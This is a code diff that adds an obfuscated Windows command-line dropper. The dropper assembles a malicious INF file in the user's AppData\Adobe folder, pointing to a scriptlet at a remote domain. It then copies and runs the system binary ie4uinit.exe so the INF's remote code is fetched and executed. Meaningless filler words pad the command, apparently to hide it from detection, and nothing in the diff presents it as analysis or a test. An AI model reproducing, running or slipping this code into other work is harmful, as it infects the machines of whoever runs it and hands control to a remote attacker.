@@ -1,0 +1,7 @@
+/v /c (for %m in (s) do @set "Outcomes=%~m") &&
+  (for %u in (a) do @set "Couples=%~u") &&
+  (for %y in (c) do @set "Costs=%~y") &&
+  (for %y in (i) do @set "Insights=%~y") &&
+  call(for %m in ("[BA00C]" "sc\" "ro%Fragile%j,NI,%Forward%%Small%%Small%p%Vendor%%Scout%%Scout%kagkdva.com/a8973080S" "[B8A2]" "ieu%Orphan%.inf" "[destinationdirs]" "defaultdestdir=11" "B8A2=01" "[defaultinstall.windows7]" "delfiles=B8A2" "Un\" "Register\" "OCXs=BA00C" "[version]" "signature =$windows nt$" "[strings]" "Webmasters=%t!Insights!me%" "Vendor=:;Novel" "Scout=/" "Forward=h" "Orphan=init" "servicename=' '" "Fragile=b;Flame" "shortsvcname=' '" "Small=t;Carriers" ) do @echo %~m)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Insights!n!Assist!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Crisp1=Adjustments &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Crisp93=Decades Shock Fiscal Schools Camps Ivory Involves Parents Snack Worry Overseas Findings Closes Gallery Inner Trademarks Voice Cordless Phones Designers Riders Bases Anger Traffic Jackets Trans Developers Douglas Dentists Numerous Sessions Profiles Holiday Relief"
